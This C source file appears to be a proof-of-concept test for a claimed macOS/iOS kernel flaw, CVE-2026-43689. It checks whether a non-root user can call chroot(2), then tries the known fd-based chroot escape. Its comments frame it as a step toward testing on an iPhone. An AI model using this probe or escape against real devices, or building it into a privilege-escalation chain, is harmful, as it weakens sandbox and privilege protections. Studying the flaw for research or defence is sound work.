/*
 * CVE-2026-43689 — Quick macOS chroot(2) test
 *
 * macOS shares XNU with iOS. If macOS 26.x has the same missing entitlement
 * check, we can iterate faster on the Mac before deploying to iPhone.
 *
 * Compile: clang -o test_chroot 02_test_chroot_macos.c
 * Run:     ./test_chroot          (as regular user, not root)
 *
 * NOTE: macOS apps are NOT sandboxed by default (unlike iOS).
 * On macOS, chroot(2) traditionally requires root.
 * If it succeeds as non-root on macOS 26.6.2, the kernel bug is confirmed.
 * If it fails with EPERM, the bug may still exist on iOS (different code paths)
 * but we'd need the iPhone to test.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <errno.h>
#include <fcntl.h>
#include <pwd.h>

int main(int argc, char **argv) {
    printf("=== CVE-2026-43689 macOS chroot(2) test ===\n");
    printf("UID: %d  EUID: %d  PID: %d\n", getuid(), geteuid(), getpid());

    struct utsname uts;
    if (uname(&uts) == 0) {
        printf("System: %s %s %s\n", uts.sysname, uts.release, uts.machine);
    }

    // Create fake root in /tmp
    const char *fakeroot = "/tmp/chroot_test_43689";
    mkdir(fakeroot, 0755);
    char path[512];

    // Create minimal structure
    const char *dirs[] = {"etc", "tmp", "var", NULL};
    for (int i = 0; dirs[i]; i++) {
        snprintf(path, sizeof(path), "%s/%s", fakeroot, dirs[i]);
        mkdir(path, 0755);
    }

    // Plant marker
    snprintf(path, sizeof(path), "%s/etc/marker", fakeroot);
    int fd = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        write(fd, "CONFIRMED\n", 10);
        close(fd);
    }

    // Save fd to real root for escape test
    int root_fd = open("/", O_RDONLY);
    printf("Saved root fd: %d\n", root_fd);

    // THE TEST
    printf("\nAttempting chroot(\"%s\") as uid %d...\n", fakeroot, getuid());

    if (chdir(fakeroot) != 0) {
        printf("chdir failed: %s\n", strerror(errno));
        return 1;
    }

    int ret = chroot(fakeroot);
    int err = errno;

    if (ret == 0) {
        printf("\n!!!! chroot(2) SUCCEEDED as non-root !!!!\n");
        printf("CVE-2026-43689 CONFIRMED on macOS\n\n");

        // Verify
        struct stat st;
        if (stat("/etc/marker", &st) == 0) {
            printf("Marker file found — we're in the fake root\n");
        }

        // Test fd-based escape
        if (root_fd >= 0) {
            if (fchdir(root_fd) == 0) {
                for (int i = 0; i < 20; i++) chdir("..");
                char cwd[1024];
                if (getcwd(cwd, sizeof(cwd))) {
                    printf("After fd escape, CWD: %s\n", cwd);
                }
            }
        }
    } else {
        printf("chroot(2) FAILED: errno=%d (%s)\n", err, strerror(err));
        if (err == EPERM) {
            printf("EPERM — root required (expected on stock macOS).\n");
            printf("The iOS kernel may have a different code path.\n");
            printf("Must test on iPhone to determine iOS behavior.\n");
        }
    }

    if (root_fd >= 0) close(root_fd);

    // Cleanup
    snprintf(path, sizeof(path), "%s/etc/marker", fakeroot);
    unlink(path);
    snprintf(path, sizeof(path), "%s/etc", fakeroot);
    rmdir(path);
    snprintf(path, sizeof(path), "%s/tmp", fakeroot);
    rmdir(path);
    snprintf(path, sizeof(path), "%s/var", fakeroot);
    rmdir(path);
    rmdir(fakeroot);

    return ret == 0 ? 0 : 1;
}
